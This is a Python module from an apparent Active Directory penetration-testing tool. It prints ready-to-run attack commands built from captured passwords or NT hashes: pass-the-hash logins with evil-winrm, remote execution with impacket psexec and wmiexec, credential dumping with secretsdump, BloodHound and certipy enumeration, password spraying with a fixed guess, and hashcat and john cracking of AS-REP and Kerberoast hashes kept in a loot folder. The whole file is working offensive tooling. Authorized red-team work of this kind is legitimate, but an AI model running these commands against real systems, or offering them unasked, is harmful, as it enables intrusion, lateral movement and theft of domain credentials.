from __future__ import annotations

from . import ui
from .state import Findings


def _auth_token(password: str | None, nt_hash: str | None) -> tuple[str, str]:
    """Return (flag, value) e.g. ('-p', 'pass') or ('-H', 'aad3...:31d6...')."""
    if nt_hash:
        return "-H", nt_hash
    return "-p", f"'{(password or '').replace(chr(39), chr(34))}'"


def emit_for_credential(findings: Findings, user: str,
                        password: str | None = None,
                        nt_hash: str | None = None) -> None:
    target = findings.target
    ip = target.ip
    domain = target.domain or "."
    flag, value = _auth_token(password, nt_hash)

    cmds: list[tuple[str, str]] = []

    cmds.append((
        "validate (nxc smb)",
        f"nxc smb {ip} -u {user} {flag} {value} -d {domain}",
    ))
    if 5985 in target.open_ports or 5986 in target.open_ports:
        if password and not nt_hash:
            cmds.append((
                "PSRemoting (evil-winrm)",
                f"evil-winrm -i {ip} -u {user} -p {value}",
            ))
        elif nt_hash:
            cmds.append((
                "PSRemoting (evil-winrm hash)",
                f"evil-winrm -i {ip} -u {user} -H {nt_hash.split(':')[-1]}",
            ))
    if 1433 in target.open_ports:
        cmds.append((
            "MSSQL client",
            f"impacket-mssqlclient {domain}/{user}{':'+ (password or '') if password else ''}@{ip}"
            f"{' -hashes ' + nt_hash if nt_hash else ''} -windows-auth",
        ))
    cmds.append((
        "exec via SMB pipe",
        f"impacket-psexec {domain}/{user}{':'+(password or '') if password else ''}@{ip}"
        f"{' -hashes '+nt_hash if nt_hash else ''}",
    ))
    cmds.append((
        "exec via WMI",
        f"impacket-wmiexec {domain}/{user}{':'+(password or '') if password else ''}@{ip}"
        f"{' -hashes '+nt_hash if nt_hash else ''}",
    ))
    cmds.append((
        "secretsdump",
        f"impacket-secretsdump {domain}/{user}{':'+(password or '') if password else ''}@{ip}"
        f"{' -hashes '+nt_hash if nt_hash else ''}",
    ))
    if target.domain:
        cmds.append((
            "BloodHound collection",
            f"bloodhound-python -d {domain} -u {user} {flag} {value} "
            f"-c All -ns {ip} --zip",
        ))
        cmds.append((
            "ADCS enumeration (certipy)",
            f"certipy-ad find -u {user}@{domain} {flag} {value} -dc-ip {ip}",
        ))
    cmds.append((
        "adenum stage 3 (everything)",
        f"adenum {ip} -d {domain} -u {user} {flag} {value} --aggressive --html report.html",
    ))

    ui.kv_block(
        f"[bold green]ready-to-run commands for {user}[/bold green]",
        {label: f"  {cmd}" for label, cmd in cmds},
    )


def emit_for_userlist(findings: Findings, user_count: int) -> None:
    target = findings.target
    if not target.domain or user_count == 0:
        return
    ui.kv_block(
        "[bold green]ready-to-run commands (userlist available)[/bold green]",
        {
            "AS-REP roast": f"  adenum {target.ip} -d {target.domain} --users loot/{target.ip}/users.txt -v",
            "kerbrute (external)": f"  kerbrute userenum -d {target.domain} --dc {target.ip} loot/{target.ip}/users.txt",
            "spray (lockout-aware)": f"  adenum {target.ip} -d {target.domain} --users loot/{target.ip}/users.txt --spray-pass 'Welcome2024!' --aggressive",
        },
    )


def emit_for_asrep(findings: Findings, hash_count: int) -> None:
    if hash_count == 0:
        return
    ui.kv_block(
        "[bold green]crack AS-REP hashes[/bold green]",
        {
            "hashcat (RC4)": f"  hashcat -m 18200 loot/{findings.target.ip}/asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
            "hashcat (AES)":  "  hashcat -m 19700 ... (replace -m for AES256)",
            "john":           f"  john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt loot/{findings.target.ip}/asrep_hashes.txt",
        },
    )


def emit_for_kerberoast(findings: Findings, hash_count: int) -> None:
    if hash_count == 0:
        return
    ui.kv_block(
        "[bold green]crack Kerberoast hashes[/bold green]",
        {
            "hashcat": f"  hashcat -m 13100 loot/{findings.target.ip}/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt",
            "john":    f"  john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt loot/{findings.target.ip}/kerberoast_hashes.txt",
        },
    )
